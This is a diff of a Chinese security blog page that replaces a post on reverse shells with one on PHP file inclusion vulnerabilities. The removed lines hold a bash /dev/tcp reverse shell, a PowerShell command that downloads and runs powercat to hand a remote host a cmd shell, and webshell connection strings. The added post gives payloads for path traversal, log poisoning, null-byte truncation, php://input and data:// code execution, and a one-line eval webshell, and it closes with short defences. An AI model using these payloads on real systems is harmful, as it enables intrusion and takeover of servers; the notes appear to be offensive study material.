@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        shell_rebound｜undefined
+        文件包含｜undefined
         
     </title>
 
-    <link rel="canonical" href="https://pengpengp.github.io/2019/01/16/shell-rebound/">
+    <link rel="canonical" href="https://pengpengp.github.io/2019/02/17/文件包含/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -136,17 +136,17 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>shell_rebound</h1>
+                    <h1>文件包含</h1>
                     
                     <span class="meta">
                          作者 pengpengp
                         <span>
-                          日期 2019-01-16
+                          日期 2019-02-17
                          </span>
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#shell反弹、powershell反弹" title="shell反弹、powershell反弹">shell反弹、powershell反弹</a>
+                        <a class="tag" href="/tags/#文件包含漏洞" title="文件包含漏洞">文件包含漏洞</a>
                         
                     </div>
                 </div>
@@ -155,7 +155,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            shell_rebound
+            文件包含
         </span>
     </div>
 </header>
@@ -166,57 +166,115 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <ul>
-<li>命令执行漏洞<code>eval=($_POST[&#39;eval&#39;])</code></li>
-</ul>
-<p>特点：能直接执行命令，也就直接能菜刀连接。计算器执行任意命令漏洞：一般需要代码审计才能找到</p>
+                <blockquote>
+<p>一.相关的四个函数：</p>
+</blockquote>
+<p>include “$path”    出错继续执行</p>
+<p>require        出错终止</p>
+<p>include once()    只能包含一次</p>
+<p>require once()</p>
+<hr>
+<blockquote>
+<p>二.本地文件包含：</p>
+</blockquote>
+<p>​    include($_GET[‘abc’])<br>        然后在地址栏给abc传入一个值 ../../../就可以随意读取目录的文件</p>
+<hr>
+<blockquote>
+<p>三.远程文件包含：</p>
+</blockquote>
+<p>​        限制条件：php.ini文件中<br>        allow_url_include=on</p>
+<p>​    在一个安全的路径下运行cmd命令：<br>        php -S 0.0.0.0:6000就会打开一个apache服务器<br>        此时用浏览器可以访问（php5.6以上才带apache）</p>
+<p>最终目的是菜刀连接</p>
+<hr>
+<blockquote>
+<p>四. 文件包含配合文件上传漏洞：结合图片马或结合日志</p>
+</blockquote>
+<p>​    先上传一张图片马，再用文件包含漏洞去执行图片使菜单可执行，然后就可以用工具连接了</p>
+<hr>
+<blockquote>
+<p>五.文件包含的意义：使图片可被执行</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>六.怎么找到文件包含漏洞：</p>
+</blockquote>
+<p>​        谷歌：inurl:?include=</p>
+<hr>
+<blockquote>
+<p>七.文件包含漏洞.结合日志    /var/log/httpd/access_log</p>
+</blockquote>
+<p>​        写入日志文件：<br>        <a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E</a></p>
+<p>​    查看（需要权限）<a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log</a></p>
+<p>​    然后可以用菜刀连</p>
+<hr>
+<blockquote>
+<p>八.iis文件包含</p>
+</blockquote>
+<p>​        目录：<code>C:\inetpub\logs\LogFiles\W3SVC3</code></p>
+<hr>
+<blockquote>
+<p>九.本地文件包含截断</p>
+</blockquote>
+<p>​    本地常见模板：&lt;?php include(“inc/“ . $_GET[‘file’] . “.htm”); ?&gt; </p>
+<p>​    1.绕过方法(转)：%00截断<br>        /etc/passwd%00<br>        (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+<p>​    2.%00截断目录遍历：<br>        /var/www/%00<br>        (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+<p>​    3.路径长度截断：<br>        /etc/passwd/././././././.[…]/./././././.<br>        (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p>​    4.点号截断：<br>        /boot.ini/………[…]…………<br>        (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<hr>
+<blockquote>
+<p>十.伪协议</p>
+</blockquote>
 <ul>
-<li>连接蚁剑得方法：</li>
-</ul>
-<p>在请求信息里添加<code>name=eval;value=1，eval($_POST[1])</code></p>
-<ul>
-<li>菜刀得连接方法：配置项中加入<code>&lt;O&gt;eval=1;eval($_POST[1])&lt;/O&gt;</code></li>
-</ul>
-<ul>
-<li><p>代码执行：</p>
-<p>system()命令</p>
+<li><p>常用伪协议的使用：</p>
+<p> file://</p>
+<pre><code>php://filter        ---用来读文件
+
+http://
+
+ftp://
+
+php://input        ---用来读post数据
+
+data://text/plain,1    ---用来修改读取的数据为1
+</code></pre></li>
+<li><p>综合前提：</p>
+<p> open_basedir</p>
+<p> include $_GET[]能用所有伪协议<br> include $_GET[].”.inc”能用http伪协议，其他形式都用不了伪协议</p>
+<p>  具体使用：</p>
 </li>
 </ul>
-<p>​    举例system(‘ping’.$ip)</p>
-<p>同时执行两条命令：<br>    windows：&amp;、&amp;&amp;、||<br>    linux：；分号、&amp;&amp;、||</p>
-<ul>
-<li>注意：<code>`反引号在linux中可以执行  ping `whoami`</code></li>
-</ul>
-<p>windows中如果容器不是iis的，（tamcat\apache等）权限都比较高，<br>linux中只有tomcat可能是root权限</p>
+<p>   -&gt;1.file://的使用</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen  on/off</span><br><span class="line">allow_url_include on/off这两条不限制</span><br></pre></td></tr></table></figure>
+<p>   ​<br>   使用：<code>http://www.ad.com/include.php?path=file://c:\aa.txt</code></p>
+<p>   -&gt;2.php://filter用法：前面部分是固定的</p>
+<pre><code>    `php://filter/read/convert.base64-encode/resource=路径+文件名`
+
+得到加密的代码，用base64解码既可以得到php文件内容    
+</code></pre><p>​    </p>
+<p>​    -&gt;3.php://input的条件及使用</p>
+<p>​    条件：allow_url_include  on   远程文件包含开启</p>
+<p>使用：<br>    地址栏为：<code>include.php?path=php://input</code><br>    然后post发包：    <code>&lt;?php phpinfo();?&gt;</code>（post写要执行的php内容就可以被执行）<br>    写一句话的方法： <code>file_put_contents(&lt;?php eval($_POST[&#39;pass&#39;])?&gt;)</code></p>
+<p>​    </p>
+<p>​    -&gt;4.data://使用</p>
+<p>​    条件 allow_url_fopen on<br>    allow_url_include   on</p>
+<p>使用：<code>file=data://text/plain,&lt;?php phpinfo();?&gt;</code><br>    或者转为base64:<code>file=data://text/plain;base64,Kjmx()9wadalniaqfhq9fHQ9fh</code></p>
+<p>题外:判断access还是sql server数据库：<br>        <code>and exists(select count(*) from sysobjects;)</code><br>        sysobjects库只有sql server有</p>
+<p><a href="http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php</a></p>
+<hr>
 <blockquote>
-<p>控制shell的方法：bash -i</p>
+<p>十一. 防御方法：</p>
 </blockquote>
-<p>受控端：–&gt;<code>bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1</code></p>
-<p>主控端：–&gt; nc中  <code>nc -lnvp40000 开始监听</code></p>
-<blockquote>
-<p>控制windows：powershell反弹</p>
-</blockquote>
-<p>受控端–&gt;：<code>nc -lnvp  9999</code></p>
-<p>主控端–&gt;：<code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 127.0.0.1 -p 9999 -e cmd</code></p>
-<blockquote>
-<p>相关的宝贵资料:</p>
-</blockquote>
-<p><a href="http://www.cnblogs.com/anruy/p/4989161.html" target="_blank" rel="noopener">nginx反向代理</a>，能进行数据的转发</p>
-<p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">linux shell反弹</a></p>
-<p><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">windows下powershell反弹</a></p>
+<p>1.php.ini中open_basedir=www目录：限制只能打开指定路径的文件</p>
+<p>2.限制接收的变量内容</p>
 
                 <hr>
                 
 
                 <ul class="pager">
                     
-                    <li class="previous">
-                        <a href="/2019/02/17/文件包含/" data-toggle="tooltip" data-placement="top" title="文件包含">&larr; Previous Post</a>
-                    </li>
-                    
                     
                     <li class="next">
-                        <a href="/2019/01/15/cross-waf/" data-toggle="tooltip" data-placement="top" title="cross_waf">Next Post &rarr;</a>
+                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top" title="shell_rebound">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
